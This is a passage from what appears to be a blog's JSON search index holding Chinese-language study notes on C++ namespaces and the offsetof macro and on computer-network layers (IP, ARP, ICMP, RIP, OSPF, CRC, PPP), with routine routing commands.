(flag = 100) &lt;&lt; endl; cout &lt;&lt; (flag = 0) &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"自定义命名空间","slug":"cpp0003-自定义命名空间","date":"2021-04-14T17:37:03.000Z","updated":"2021-12-28T18:34:37.484Z","comments":true,"path":"2021/04/15/cpp0003-自定义命名空间/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0003-自定义命名空间/","excerpt":"","text":"自定义命名空间 12345678910/*语法:namespace 自定义命名空间名&#123;内容&#125;*/ 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include&lt;iostream&gt;using namespace std;namespace xiaochenyanA &#123; int a;&#125;namespace xiaochenyanB &#123; int a; //可以嵌套定义命名空间 namespace xiaochenyanC &#123; typedef struct student &#123; float score; &#125;student_t; &#125; namespace xiaochenyanD &#123; typedef struct student &#123; double score; &#125;student_t; &#125; //默认使用xiaochenyanC命名空间下的变量或对象,不建议这样做 using namespace xiaochenyanC;&#125;int main(int argc, char* argv[])&#123; using namespace xiaochenyanA; using namespace xiaochenyanB; using namespace xiaochenyanB::xiaochenyanC; student_t xiaoming = &#123; 100.0f &#125;; cout &lt;&lt; xiaoming.score &lt;&lt; endl; //如果命名空间中的对象冲突,需要使用命名空间名来引用对象 cout &lt;&lt; (xiaochenyanA::a = 100) &lt;&lt; endl; cout &lt;&lt; xiaochenyanA::a &lt;&lt; endl; cout &lt;&lt; xiaochenyanB::a &lt;&lt; endl; //程序暂停 cin.get(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"namespace命名空间","slug":"cpp0002-namespace命名空间","date":"2021-04-14T16:43:28.000Z","updated":"2021-12-28T18:34:34.435Z","comments":true,"path":"2021/04/15/cpp0002-namespace命名空间/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0002-namespace命名空间/","excerpt":"","text":"namespace命名空间 假如同一个公司有两个张三，当你叫张三的时候，两个张三都会回头。这就出现了二义性。 为了区分这两个张三，就引进了命名空间。 第一个张三可以叫为张三A 第二个张三可以叫为张三B 12345678910111213141516171819#include&lt;iostream&gt;//方式1，可以直接使用std内的元素using namespace std;//方式2，可以直接使用coutusing std::cout;int main(int argc, char* argv[])&#123; //方式3，通过命名空间名来引用cout std::cout; return 0;&#125; 12345678910111213141516#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; &#123; //只能在本复合语句内使用 using std::cout; &#125; cout &lt;&lt; a;//出错 return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"第一个c++程序 hello world","slug":"cpp0001第一个c-程序-hello-world","date":"2021-04-14T16:37:42.000Z","updated":"2021-12-28T18:34:30.955Z","comments":true,"path":"2021/04/15/cpp0001第一个c-程序-hello-world/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0001第一个c-程序-hello-world/","excerpt":"","text":"第一个c++程序 hello world 123456789101112131415#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; cout &lt;&lt; \"hello world\" &lt;&lt; endl; int a; cin &gt;&gt; a; return 0;&#125; cout 表示输出流，将hello world流到终端 endl 表示换行 cin 表示输入流，从键盘输入内容流到变量a中 1234if 0//可以理解为注释,编译器会忽略里面的代码endif","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"关于#define offsetof(s,m) (size_t)&(((s *)0)->m)","slug":"cpp0000offsetof","date":"2021-04-14T16:37:42.000Z","updated":"2021-12-28T18:34:27.421Z","comments":true,"path":"2021/04/15/cpp0000offsetof/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0000offsetof/","excerpt":"","text":"#define offsetof(s,m) (size_t)&amp;(((s *)0)-&gt;m) s是一个结构体，m是s的成员变量 这个宏的作用是取到s中的m相对于s的偏移量 (s *)0 将0强制转换为s类型的指针，并指向0地址 ((s *)0)-&gt;m 使该指针指向成员变量m &amp;(((s *)0)-&gt;m)获取成员变量m的地址，因为首地址是0，所以m的地址值就等于m的偏移量。此处编译器不会生成访问m的代码，而是直接计算出地址值 (size_t)&amp;(((s *)0)-&gt;m) 将地址转换为size_t类型","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"第四章网络层","slug":"计算机网络原理笔记-第四章网络层","date":"2021-04-14T15:31:49.000Z","updated":"2021-04-14T16:06:16.574Z","comments":true,"path":"2021/04/14/计算机网络原理笔记-第四章网络层/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/14/计算机网络原理笔记-第四章网络层/","excerpt":"","text":"计算机网络原理笔记 第四章 网络层 网络层提供得两种服务 1.虚电路服务 2.数据包服务 虚电路服务与数据报服务的对比 网际协议 IP 1.虚拟互联网 2.IP地址 3.划分子网和构造超网 4.IP地址与硬件地址 5.ARP &amp; RARP 6.IP数据报格式 7.IP转发分组的流程 网际控制报文协议 ICMP 互联网的路由选择协议 （1）内部网关协议RIP (2)内部网关协议OSPF IP多播 网络地址转换NAT 网络层提供得两种服务 网络层提供的两种服务 在计算机网络领域，网络层应该向运输层提供怎样的服务（“面向连接”还是“无连接”）曾引起了长期的争论。 争论焦点的实质就是：在计算机通信中，可靠交付应当由谁来负责？是网络还是网络层提供的两种服务 在计算机网络领域，网络层应该向运输层提供怎样的服务（“面向连接”还是“无连接”）曾引起了长期的争论。 争论焦点的实质就是：在计算机通信中，可靠交付应当由谁来负责？是网络还是端系统？ ？ 两种服务：网络层应该向运输层提供怎样得服务 虚电路服务 数据包服务 1.虚电路服务 面向连接的通信方式 建立虚电路(Virtual Circuit)，以保证双方通信所需的一切网络资源。 如果再使用可靠传输的网络协议，就可使所发送的分组无差错按序到达终点。 虚电路是逻辑连接 虚电路表示这只是一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发方式传送，而并不是真正建立了一条物理连接。 请注意，电路交换的电话通信是先建立了一条真正的连接。因此分组交换的虚连接和电路交换的连接只是类似，但并不完全一样。 . . 2.数据包服务 因特网采用的设计思路 网络层向上只提供简单灵活的、无连接的、尽最大努力交付的数据报服务。 网络在发送分组时不需要先建立连接。每一个分组（即 IP 数据报）独立发送，与其前后的分组无关（不进行编号）。 网络层不提供服务质量的承诺。即所传送的分组可能出错、丢失、重复和失序（不按序到达终点），当然也不保证分组传送的时限。 . . 尽最大努力交付的好处 由于传输网络不提供端到端的可靠传输服务，这就使网络中的路由器可以做得比较简单，而且价格低廉（与电信网的交换机相比较）。 如果主机（即端系统）中的进程之间的通信需要是可靠的，那么就由网络的主机中的运输层负责（包括差错处理、流量控制等）。 采用这种设计思路的好处是：网络的造价大大降低，运行方式灵活，能够适应多种应用。 因特网能够发展到今日的规模，充分证明了当初采用这种设计思路的正确性。 . . 虚电路服务与数据报服务的对比 对比的方面 虚电路服务 数据报服务 思路 可靠通信应当由网络来保证 可靠通信应当由用户主机来保证 连接的建立 必须有 不需要 终点地址 仅在连接建立阶段使用，每个分组使用短的虚电路号 每个分组都有终点的完整地址 分组的转发 属于同一条虚电路的分组均按照同一路由进行转发 每个分组独立选择路由进行转发 当结点出故障时 所有通过出故障的结点的虚电路均不能工作 出故障的结点可能会丢失分组，一些路由可能会发生变化 分组的顺序 总是按发送顺序到达终点 到达终点时不一定按发送顺序 端到端的差错处理和流量控制 可以由网络负责，也可以由用户主机负责 由用户主机负责 . . 网际协议 IP 1.虚拟互联网 网络层中间设备 中间设备又称为中间系统或中继(relay)系统。 物理层中继系统：转发器(repeater)。 数据链路层中继系统：网桥或桥接器(bridge)。 网络层中继系统：路由器(router)。 网络层以上的中继系统：网关(gateway)。 注： 现在说的网关一般指的是路由器接口，网关地址一般习惯使用本网段第一个地址或者最后一个地址 虚拟互连网络的意义 所谓虚拟互连网络也就是逻辑互连网络，它的意思就是互连起来的各种物理网络的异构性本来是客观存在的，但是我们利用 IP 协议就可以使这些性能各异的网络从用户看起来好像是一个统一的网络。 使用 IP 协议的虚拟互连网络可简称为 IP 网。 使用虚拟互连网络的好处是：当互联网上的主机进行通信时，就好像在一个网络上通信一样，而看不见互连的各具体的网络异构细节。 . . 2.IP地址 本小节我转载了与韩老师讲解思路一致 但是总结的更详细的IP地址与划分博文合集笔记供大家阅读 点下方链接就可进入 1、IP地址和子网划分学习笔记之《预备知识：进制计数》 2、IP地址和子网划分学习笔记之《IP地址详解》 3、IP地址和子网划分学习笔记之《子网掩码详解》 3.划分子网和构造超网 本小节我转载了与韩老师讲解思路一致 但是总结的更详细的IP地址与划分博文合集笔记供大家阅读 点下方链接就可进入 4、IP地址和子网划分学习笔记之《子网划分详解》 5、IP地址和子网划分学习笔记之《超网合并详解》 4.IP地址与硬件地址 本小节我转载了与韩老师讲解思路一致 但是总结的更详细的IP地址与划分博文合集笔记供大家阅读 点下方链接就可进入 2、IP地址和子网划分学习笔记之《IP地址详解》 . . 5.ARP &amp; RARP ARP简介 不管网络层使用的是什么协议，在实际网络的链路上传送数据帧时，最终还是必须使用硬件地址。 每一个主机都设有一个 ARP 高速缓存(ARP cache)，里面有所在的局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。 当主机 A 欲向本局域网上的某个主机 B 发送 IP 数据报时，就先在其 ARP 高速缓存中查看有无主机 B 的 IP 地址。如有，就可查出其对应的硬件地址，再将此硬件地址写入 MAC 帧，然后通过局域网将该 MAC 帧发往此硬件地址。 ARP高速缓存的作用 为了减少网络上的通信量，主机 A 在发送其 ARP 请求分组时，就将自己的 IP 地址到硬件地址的映射写入 ARP 请求分组。 当主机 B 收到 A 的 ARP 请求分组时，就将主机 A 的这一地址映射写入主机 B 自己的 ARP 高速缓存中。这对主机 B 以后向 A 发送数据报时就更方便了。 . . 使用 ARP 的四种典型情况 发送方是主机，要把IP数据报发送到本网络上的另一个主机。这时用 ARP 找到目的主机的硬件地址。 发送方是主机，要把 IP 数据报发送到另一个网络上的一个主机。这时用 ARP 找到本网络上的一个路由器的硬件地址。剩下的工作由这个路由器来完成。 发送方是路由器，要把 IP 数据报转发到本网络上的一个主机。这时用 ARP 找到目的主机的硬件地址。 发送方是路由器，要把 IP 数据报转发到另一个网络上的一个主机。这时用 ARP 找到本网络上的一个路由器的硬件地址。剩下的工作由这个路由器来完成。 . . 应当注意的问题 ARP 是解决同一个局域网上的主机或路由器的 IP 地址和硬件地址的映射问题。 如果所要找的主机和源主机不在同一个局域网上，那么就要通过 ARP 找到一个位于本局域网上的某个路由器的硬件地址，然后把分组发送给这个路由器，让这个路由器把分组转发给下一个网络。剩下的工作就由下一个网络来做。 从IP地址到硬件地址的解析是自动进行的，主机的用户对这种地址解析过程是不知道的。 只要主机或路由器要和本网络上的另一个已知 IP 地址的主机或路由器进行通信，ARP 协议就会自动地将该 IP 地址解析为链路层所需要的硬件地址。 . . 逆地址解析协议 RARP 逆地址解析协议 RARP 使只知道自己硬件地址的主机能够知道其 IP 地址。 . 6.IP数据报格式 IP数据包 一个 IP 数据包由首部和数据两部分组成。 首部的前一部分是固定长度，共 20 字节，是所有 IP 数据报必须具有的。 在首部的固定部分的后面是一些可选字段，其长度是可变的。 IP 数据报首部的固定部分中的各字段 版本——占4位，指IP协议的版本，目前使用的IP协议版本号为4（即IPv4） 首部长度——占4位，课表示的最大数值 是15个单位(一个单位为4字节)，因此IP的首部长度的最大值是60字节。 区分服务——让数据包加上一个标记，来告诉网络上那些传输的数据，这些数据包在传的时候 是着急还是不着急。QOS服务质量 总长度——占16位，指首部和数据之和的长度，单位位字节，因此数据报的最大长度位65535字节。总长度必须不超过最大传送单元MTU。 标识——占16位，它是一个计数器，用老产生数据报的标识，不是序号，每产生一个数据包，就增加1。 标志——占3位，目前只有前两位有意义。标志字段的最低位是MF。 MF=1表示后面“还有分片”。MF=0表示最后一个分片。标志字段中间的一位是DF。 只有当DF=0时才允许分片。 生存时间 记位TTL （Time To Live） 占8位，数据报在网络中可通过的路由器数的最大值 数据包没过一个路由器 TTL-1 协议——协议（8位）字段指出此数据报携带的数据使用何种学语以便目的主机的IP层讲数据部分交给哪个处理 首部检验和——首部检验和(16 位)字段只检验数据报的首部，不检验数据部分。这里不采用 CRC 检验码而采用简单的计算方法。 . . IP数据报首部的可变部分 IP 首部的可变部分就是一个选项字段，用来支持排错、测量以及安全等措施，内容很丰富。 选项字段的长度可变，从 1 个字节到 40 个字节不等，取决于所选择的项目。 增加首部的可变部分是为了增加 IP 数据报的功能，但这同时也使得 IP 数据报的首部长度成为可变的。这就增加了每一个路由器处理数据报的开销。 实际上这些选项很少被使用。 . . 7.IP转发分组的流程 数据包如何路由 IP路由 路由就是路由器从一个网段到另外一个网段转发数据包的过程，即数据包通过路由器转发，就是数据路由。 网络畅通条件，要求数据包必须能够到达目标地址，同时数据包必须能够返回发送地址。 这就要求沿途经过的路由器必须知道到目标网络如何转发数据包，即到达目的网络下一跳转发给哪个路由器，也就是必须有到达目标网络的路由，沿途的路由器还必须有数据包返回所需的路由。 . 数据路由：路由器在不同网段转发数据包 网络畅通的条件：能去能回 沿途的路由器必须知道目标网络下一跳给哪个接口 沿途的路由器必须知道源网络下一跳给哪个接口 如图所示，计算机PC0 ping PC1，网络要想通，要求沿途的路由器Router0，Router1，Router2，Router3都必须有到192.168.1.0/24网络的路由，这样数据包才能到达PC1。 PC1要回应数据包给PC0，沿途所有的路由器必须有到192.168.0.0/24网络的路由，这样数据包才能回来。 . . 配置静态路由 默认路由 网络地址和子网掩码都为0，如图所示配置，这就意味着到任何网络下一跳转发给10.0.0.2。 网络地址和子网掩码均为0的路由就是默认路由。 Router(config)#ip route 0.0.0.0 0.0.0.0 10.0.0.2 . . Windows上的默认路由和网关 计算机也有路由表，我们可以在计算机上运行route print显示Windows操作系统上的路由表。 运行netstat –r也可以显示Windows操作系统上的路由表。 如图所示，给计算机配置网关就是给计算机添加默认路由。 . . 如果不配置计算机的网关，使用以下命令添加默认路由。 如图所示，去掉本地连接的网关，在命令提示符下，输入route print ，可以看到没有默认路由了，该计算机也不能访问其他网段，ping 202.99.160.68 提示“目标主机不可到达”。 . . 如图所示，在命令提示符下，输入route /?可以看到该命令的帮助。 输入route add 0.0.0.0 mask 0.0.0.0 192.168.8.1，添加默认路由。 输入route print 可以显示路由表，默认路由已经出现。 Ping 202.99.160.68 可以ping通。 . . 如图所示，内网的计算机需要配置IP地址、子网掩码和网关，网关就是Server的内网网卡的IP地址。在Server的两个连接，内网的网卡不需要配置网关，但是连接Internet的网卡需要配置默认网关。 . . 注意 IP 数据报的首部中没有地方可以用来指明“下一跳路由器的 IP 地址”。 当路由器收到待转发的数据报，不是将下一跳路由器的 IP 地址填入 IP 数据报，而是送交下层的网络接口软件。 网络接口软件使用 ARP 负责将下一跳路由器的 IP 地址转换成硬件地址，并将此硬件地址放在链路层的 MAC 帧的首部，然后根据这个硬件地址找到下一跳路由器。 . . 网际控制报文协议 ICMP ICMP简介 为了提高 IP 数据报交付成功的机会，在网际层使用了网际控制报文协议 ICMP (Internet Control Message Protocol)。 ICMP 允许主机或路由器报告差错情况和提供有关异常情况的报告。 ICMP 不是高层协议，而是 IP 层的协议。 ICMP 报文作为 IP 层数据报的数据，加上数据报的首部，组成 IP 数据报发送出去。 . . ICMP报文格式 . . ICMP报文的类型 ICMP 报文的种类有两种，即 ICMP 差错报告报文和 ICMP 询问报文。 ICMP 报文的前 4 个字节是统一的格式，共有三个字段：即类型、代码和检验和。接着的 4 个字节的内容与 ICMP 的类型有关。 差错报告报文有五种：终点不可达 ，源点抑制(Source quench) ，时间超过 ，参数问题 ，改变路由（重定向）(Redirect) 询问报文有两种：回送请求和回答报文，时间戳请求和回答报文 差错报告报告报文的数据字段的内容 . . ICMP应用举例 PING 用来测试两个主机之间的连通性。 PING 使用了 ICMP 回送请求与回送回答报文。 PING 是应用层直接使用网络层 ICMP 的例子，它没有通过运输层的 TCP 或UDP。 Pathping tracert . . ping命令诊断网络故障 PING（Packet Internet Grope），因特网包探索器，用于测试网络连接量的程序。Ping发送一个ICMP回声请求消息给目的地并报告是否收到所希望的ICMP回声应答。 ping指的是端对端连通，通常用来作为可用性的检查， 但是某些病毒木马会强行大量远程执行ping命令抢占你的网络资源，导致系统变慢，网速变慢。 严禁ping入侵作为大多数防火墙的一个基本功能提供给用户进行选择。 如果你打开IE浏览器访问网站失败，你可以通过ping命令测试到Internet的网络连通，可以为你排除网络故障提供线索，下面展示ping命令返回的信息以及分析其原因。 . 目标主机不可到达 目标网络不可到达 请求超时 通过延迟评估网络带宽 . . Pathping跟踪数据包的路径 使用ping能够判断网络通还是不通，比如请求超时，你就不能判断什么位置出现的网络故障造成的请求超时。使用pathping命令能跟踪数据包的路径，能够查出故障点，并且能够计算路由器转发丢包率和链路丢包率以及延迟，据此能够判断出网络拥塞情况。 互联网的路由选择协议 路由选择协议的核心就是路由算法，一个理想的路由算法应该以下特点： 算法必须是正确的和完整的：沿着各路由表所指引的路由，分组一定能够最终到达目的网络和目的主机 算法在计算上应简单 算法应能适应通信量和网络拓扑的变化：即要有自适应性。 算法应具有稳定性 算法应该是公平的 算法应该是最佳的 路由选择包括静态和动态： 静态（非自适应路由选择）：简单和开销较小，但不能及时适应网络状态的变化，适用于简单的小网络 动态（自适应路由）：能较好地适应网络状态的变化。但实现起来较为复杂，开销比较大。 互联网才用的路由选择协议主要是自适应、分布式路由选择协议，由于以下两个原因，互联网采用分层次的路由选择协议： 互联网的规模非常大，如果让所有的路由器知道所有的网络应怎样到达，则这种路由表将非常大 许多单位不愿意外界了解自己单位网路的布局细节和本部门所采用的路由选择协议，但同时还希望连接到互联网上。 . 为此，把整个互联网划分为许多较小的自治系统AS（autonomous system）。自治系统AS是在单一技术管理下的一组路由器，这些路由器使用一种自治系统内部的路由选择协议和共同的度量。一个AS对其他AS表现出的是一个单一的和一直的路由选择策略。 这样就把路由选择协议划分为两大类： 内部网关协议IGP（Interior Gateway protocol）:也叫作域内路由选择，即在一个自治系统内部使用的路由选择协议，如RIP和OSPF协议。 外部网关协议EGP（External Gateway Protocol）：也叫作域间路由选择，若源主机和目的主机处在不同的自治系统中，当数据报传到一个自治系统的边界时，就需要使用一种协议将路由选择信息传递到另一个自治系统中。 （1）内部网关协议RIP RIP是一种分布式的基于距离向量的路由选择协议。 RIP要求每一个路由器都要维护从它自己到其他每一个目的网络距离记录。 距离的定义：从一个路由器到直接连接的网络的距离定义为1/0，其中每经过一次路由器就加1，也称为“跳数”。 分布式路由的特点就是：每一个路由器都要不断地和其他一些路由器交换路由信息，周期性广播。 RIP协议的特点： 仅和相邻路由器交换信息。 路由器交换的信息使当前本路由器所知道的全部信息，即自己现在的路由表，包括到本自治网络的最短距离，以及到每个网络应经过的下一跳路由器。 按照固定的时间间隔交换路由信息。 路由器刚刚开始工作时，它的路由表是空的，经过若干次更新后，所有路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器的地址。 距离向量算法：找出每个目的网络的最短距离算法。 收到相邻路由器（其地址为 X）的一个 RIP 报文： (1) 先修改此 RIP 报文中的所有项目：把“下一跳”字段中的地址都改为 X，并把所有的“距离”字段的值加 1。 (2) 对修改后的 RIP 报文中的每一个项目，重复以下步骤： 若项目中的目的网络不在路由表中，则把该项目加到路由表中。 否则 ​ 若下一跳字段给出的路由器地址是同样的，则把收到的项 目 替换原路由表中的项目。 否则 ​ 若收到项目中的距离小于路由表中的距离，则进行更新， 否则，什么也不做。 (3) 若 3 分钟还没有收到相邻路由器的更新路由表，则把此相邻路由器记为不可达路由器，即将距离置为16（距离为16表示不可达）。 RIP协议的优缺点 RIP 存在的一个问题是当网络出现故障时，要经过比较长的时间才能将此信息传送到所有的路由器。 RIP 协议最大的优点就是实现简单，开销较小。 RIP 限制了网络的规模，它能使用的最大距离为 15（16 表示不可达）。 路由器之间交换的路由信息是路由器中的完整路由表，因而随着网络规模的扩大，开销也就增加。 . . (2)内部网关协议OSPF OSPF 协议的基本特点 “开放”表明 OSPF 协议不是受某一家厂商控制，而是公开发表的。 “最短路径优先”是因为使用了 Dijkstra 提出的最短路径算法SPF OSPF 只是一个协议的名字，它并不表示其他的路由选择协议不是“最短路径优先”。 是分布式的链路状态协议。 . . 三个要点 向本自治系统中所有路由器发送信息，这里使用的方法是洪泛法。 发送的信息就是与本路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。 “链路状态”就是说明本路由器都和哪些路由器相邻，以及该链路的“度量”(metric)。 只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息。 . . 链路状态数据库 由于各路由器之间频繁地交换链路状态信息，因此所有的路由器最终都能建立一个链路状态数据库。 这个数据库实际上就是全网的拓扑结构图，它在全网范围内是一致的（这称为链路状态数据库的同步）。 OSPF 的链路状态数据库能较快地进行更新，使各个路由器能及时更新其路由表。OSPF 的更新过程收敛得快是其重要优点。 \\ OSPF 划分为两种不同的区域 划分区域 划分区域的好处就是将利用洪泛法交换链路状态信息的范围局限于每一个区域而不是整个的自治系统，这就减少了整个网络上的通信量。 在一个区域内部的路由器只知道本区域的完整网络拓扑，而不知道其他区域的网络拓扑的情况。 OSPF 使用层次结构的区域划分。在上层的区域叫作主干区域(backbone area)。主干区域的标识符规定为0.0.0.0。主干区域的作用是用来连通其他在下层的区域。 OSPF 直接用 IP 数据报传送 OSPF 不用 UDP 而是直接用 IP 数据报传送。 OSPF 构成的数据报很短。这样做可减少路由信息的通信量。 数据报很短的另一好处是可以不必将长的数据报分片传送。分片传送的数据报只要丢失一个，就无法组装成原来的数据报，而整个数据报就必须重传。 . . OSPF 的其他特点 OSPF 对不同的链路可根据 IP 分组的不同服务类型 TOS 而设置成不同的代价。因此，OSPF 对于不同类型的业务可计算出不同的路由。 如果到同一个目的网络有多条相同代价的路径，那么可以将通信量分配给这几条路径。这叫作多路径间的负载平衡。 所有在 OSPF 路由器之间交换的分组都具有鉴别的功能。 支持可变长度的子网划分和无分类编址 CIDR。 每一个链路状态都带上一个 32 位的序号，序号越大状态就越新。 OSPF 的五种分组类型 类型1，问候(Hello)分组。 类型2，数据库描述(Database Description)分组。 类型3，链路状态请求(Link State Request)分组。 类型4，链路状态更新(Link State Update)分组， 用洪泛法对全网更新链路状态。 类型5，链路状态确认(Link State Acknowledgment) 分组。 . . OSPF 的其他特点 OSPF 还规定每隔一段时间，如 30 分钟，要刷新一次数据库中的链路状态。 由于一个路由器的链路状态只涉及到与相邻路由器的连通状态，因而与整个互联网的规模并无直接关系。因此当互联网规模很大时，OSPF 协议要比距离向量协议 RIP 好得多。 OSPF 没有“坏消息传播得慢”的问题，据统计，其响应网络变化的时间小于 100 ms。 IP多播 网络地址转换NAT","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"第三章 数据链路层","slug":"计算机网络原理笔记-第三章-数据链路层","date":"2021-03-31T16:50:41.000Z","updated":"2021-03-31T18:00:00.421Z","comments":true,"path":"2021/04/01/计算机网络原理笔记-第三章-数据链路层/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/01/计算机网络原理笔记-第三章-数据链路层/","excerpt":"","text":"计算网络原理 第三章 数据链路层 数据链路层（一） 3.1 使用点对点信道的数据链路层 3.1.1 数据链路层和帧 3.1.2 三个基本问题 数据链路层的信道类型 3.2 点对点协议 PPP 3.2.1 PPP协议的特点 3.2.2 PPP协议的帧格式 3.2.3 PPP协议的工作状态 3.3 使用广播信道的数据链路层(局域网) 3.3.1 局域网的数据链路层 数据链路层（一） 3.1 使用点对点信道的数据链路层 3.1.1 数据链路层和帧 *数据发送模型* *数据链路层的信道类型* 数据链路层使用的信道主要有以下两种类型： 点对点信道。这种信道使用一对一的点对点通信方式。 广播信道。这种信道使用一对多的广播通信方式，因此过程比较复杂。广播信道上连接的主机很多，因此必须使用专用的共享信道协议来协调这些主机的数据发送。 . . 链路与数据链路 **链路(link)**是一条无源的点到点的物理线路段，中间没有任何其他的交换结点。 一条链路只是一条通路的一个组成部分。 数据链路(data link) 除了物理线路外，还必须有通信协议来控制这些数据的传输。若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。 现在最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。 一般的适配器都包括了数据链路层和物理层这两层的功能。 帧 数据链路层传送的是帧 . . 3.1.2 三个基本问题 1.封装成帧 封装成帧(framing) 就是在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。确定帧的界限。 首部和尾部的一个重要作用就是进行帧定界。 用控制字符进行帧定界的方法举例 试想：帧还未发送完，发送端出了问题，只能重发该帧。接收端却收到了前面的“半截子帧”，它会抛弃吗？为什么？ 2.透明传输 若传输的数据是ASCII码中“可打印字符(共95个)“集时，一切正常。 若传输的数据不是仅由”可打印字符”组成时，就会出问题，如下 用字节填充法解决透明传输问题 发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC”(其十六进制编码是 1B)。 字节填充(byte stuffing)或字符填充(character stuffing)——接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。 如果转义字符也出现数据当中，那么应在转义字符前面插入一个转义字符。当接收端收到连续的两个转义字符时，就删除其中前面的一个。 当传送的帧是用文本文件组成的帧时（文本文件中的字都是从键盘上输入的），其数据部分显然不会出现像SOH或EOT这样的帧定界控制字符。可见不管从键盘上输入什么字符都可以放在这样的帧中传输过去，因此这样的传输就是透明传输。 . . 3.差错控制 在传输过程中可能会产生比特差错：1 可能会变成 0 而 0 也可能变成 1。 在一段时间内，传输错误的比特占所传输比特总数的比率称为误码率 BER (Bit Error Rate)。 误码率与信噪比有很大的关系。 为了保证数据传输的可靠性，在计算机网络传输数据时，必须采用各种差错检测措施。 循环冗余检验的原理 在数据链路层传送的帧中，广泛使用了循环冗余检验 CRC 的检错技术。 在发送端，先把数据划分为组。假定每组 k 个比特。 假设待传送的一组数据 M = 101001（现在 k = 6）。我们在 M 的后面再添加供差错检测用的 n 位冗余码一起发送。 冗余码的计算 用二进制的模 2 运算进行 2n 乘 M 的运算，这相当于在 M 后面添加 n 个 0。 得到的 (k + n) 位的数除以事先选定好的长度为 (n + 1) 位的除数 P，得出商是 Q 而余数是 R，余数 R 比除数 P 少1 位，即 R 是 n 位。 冗余码的计算举例 现在 k = 6, M = 101001。 设 n = 3, 除数 P = 1101， 被除数是 2n**M = 101001000。 模 2 运算的结果是：商 Q = 110101， 余数 R = 001。 把余数 R 作为冗余码添加在数据 M 的后面发送出去。发送的数据是：2n**M + R 即：101001001，共 (k + n) 位。 循环冗余检验的原理说明 帧检验序列 FCS 在数据后面添加上的冗余码称为帧检验序列 FCS (Frame Check Sequence)。 循环冗余检验 CRC 和帧检验序列 FCS并不等同。 CRC 是一种常用的检错方法，而 FCS 是添加在数据后面的冗余码。 FCS 可以用 CRC 这种方法得出，但 CRC 并非用来获得 FCS 的唯一方法。 接收端对收到的每一帧进行 CRC 检验 (1) 若得出的余数 R = 0，则判定这个帧没有差错，就接受(accept)。 (2) 若余数 R ≠ 0，则判定这个帧有差错，就丢弃。 但这种检测方法并不能确定究竟是哪一个或哪几个比特出现了差错。 只要经过严格的挑选，并使用位数足够多的除数 P，那么出现检测不到的差错的概率就很小很小。 补零位数比除数位数少一 异或运算 1+1=0 1+0=0 0+1=0 0+0=0 除数由两台计算机数据链路层协议决定 *小结：CRC差错检测技术* 仅用循环冗余检验 CRC 差错检测技术只能做到无差错接受(accept)。 “无差错接受”是指：“凡是接受的帧（即不包括丢弃的帧），我们都能以非常接近于 1 的概率认为这些帧在传输过程中没有产生差错”。也就是说：“凡是接收端数据链路层接受的帧都没有传输差错”（有差错的帧就丢弃而不接受）。 要做到“可靠传输”（即发送什么就收到什么）就必须再加上确认和重传机制。 考虑：帧重复、帧丢失、帧乱序的情况 可以说“CRC是一种无比特差错，而不是无传输差错的检测机制” OSI/RM模型的观点:数据链路层要做成无传输差错的!但这种理念目前不被接受。 . . . 数据链路层的信道类型 •数据链路层使用的信道主要有以下两种类型： 点对点信道。 这种信道使用一对一的点对点通信方式。 广播信道。 这种信道使用一对多的广播通信方式，因此过程比较复杂。广播信道上连接的主机很多，因此必须使用专用的共享信道协议来协调这些主机的数据发。 . · 3.2 点对点协议 PPP 现在全世界使用得最多的数据链路层协议是点对点协议 PPP (Point-to-Point Protocol)。 用户使用拨号电话线接入因特网时，一般都是使用 PPP 协议。 用户到 ISP 的链路使用 PPP 协议 3.2.1 PPP协议的特点 PPP 协议应满足的需求 简单——这是首要的要求 封装成帧 透明性 多种网络层协议 多种类型链路 差错检测 检测连接状态 最大传送单元 网络层地址协商 数据压缩协商 · PPP 协议不需要的功能 纠错 流量控制 序号 多点线路 半双工或单工链路 PPP 协议的组成 1992 年制订了 PPP 协议。经过 1993 年和 1994 年的修订，现在的 PPP 协议已成为因特网的正式标准[RFC 1661]。 PPP 协议有三个组成部分 一个将 IP 数据报封装到串行链路的方法。 链路控制协议 LCP (Link Control Protocol)。 网络控制协议 NCP (Network Control Protocol)。 . . 3.2.2 PPP协议的帧格式 标志字段 F = 0x7E （符号“0x”表示后面的字符是用十六进制表示。十六进制的 7E 的二进- - 制表示是 01111110）。 地址字段 A 只置为 0xFF。地址字段实际上并不起作用。 控制字段 C 通常置为 0x03。 PPP 是面向字节的，所有的 PPP 帧的长度都是整数字节。 透明传输问题 当 PPP 用在同步传输链路时，协议规定采用硬件来完成比特填充（和 HDLC 的做法一样）。 当 PPP 用在异步传输时，就使用一种特殊的 字符填充法 。 字符填充 将信息字段中出现的每一个 0x7E 字节转变成为 